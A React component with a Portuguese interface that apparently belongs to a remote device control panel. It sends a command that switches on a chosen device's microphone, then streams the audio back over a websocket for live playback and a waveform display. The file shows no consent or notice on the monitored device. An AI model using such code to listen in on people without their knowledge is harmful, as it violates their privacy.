import { useEffect, useRef, useState } from 'react';
import { ws } from '../../ws.js';

const SAMPLE_RATE = 16000;

export default function LiveAudio({ deviceId, onBack, sendCmd }) {
  const canvasRef = useRef(null);
  const audioCtx  = useRef(null);
  const [active, setActive] = useState(false);
  const [chunks,  setChunks]  = useState(0);

  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.type !== 'audio_chunk' || msg.device_id !== deviceId) return;
      if (!active || !audioCtx.current) return;
      try {
        const raw  = atob(msg.data);
        const buf  = new ArrayBuffer(raw.length);
        const u8   = new Uint8Array(buf);
        for (let i = 0; i < raw.length; i++) u8[i] = raw.charCodeAt(i);
        const i16  = new Int16Array(buf);
        const ctx  = audioCtx.current;
        const ab   = ctx.createBuffer(1, i16.length, SAMPLE_RATE);
        const ch   = ab.getChannelData(0);
        for (let i = 0; i < i16.length; i++) ch[i] = i16[i] / 32768;
        drawWaveform(ch);
        const src = ctx.createBufferSource();
        src.buffer = ab;
        src.connect(ctx.destination);
        src.start();
        setChunks(n => n + 1);
      } catch (err) { console.error('audio:', err); }
    });
    return unsub;
  }, [deviceId, active]);

  function drawWaveform(samples) {
    const c = canvasRef.current; if (!c) return;
    const ctx = c.getContext('2d');
    c.width  = c.offsetWidth  || 340;
    c.height = c.offsetHeight || 70;
    ctx.fillStyle = '#040406'; ctx.fillRect(0, 0, c.width, c.height);
    ctx.strokeStyle = '#d4950a'; ctx.lineWidth = 1.5; ctx.beginPath();
    const step = Math.floor(samples.length / c.width) || 1;
    for (let i = 0; i < c.width; i++) {
      const s = samples[i * step] || 0;
      const y = (s * 0.45 + 0.5) * c.height;
      i === 0 ? ctx.moveTo(i, y) : ctx.lineTo(i, y);
    }
    ctx.stroke();
  }

  function start() {
    const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
    ctx.resume();
    audioCtx.current = ctx;
    sendCmd('TOGGLE_MICROPHONE', { enabled: true });
    ws.subscribe('audio', deviceId);
    setActive(true);
  }
  function stop() {
    sendCmd('TOGGLE_MICROPHONE', { enabled: false });
    ws.unsubscribe('audio', deviceId);
    audioCtx.current?.close();
    audioCtx.current = null;
    setActive(false);
  }

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">🎤 ÁUDIO AO VIVO</div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      <canvas ref={canvasRef} style={{ width: '100%', height: 70, borderRadius: 8, border: '1px solid var(--gold-border)', marginBottom: 12, display: 'block' }} />

      <div className="row-sb mb12">
        <span className="txt-xs txt-dim">PCM 16-bit · 16kHz · Mono</span>
        {active && <span className="pill pill-green">{chunks} chunks recebidos</span>}
      </div>

      <div className="grid g2">
        <button className="btn btn-gold btn-block" onClick={start}>🎤 INICIAR</button>
        <button className="btn btn-red btn-block" onClick={stop}>⏹ PARAR</button>
      </div>
    </div>
  );
}
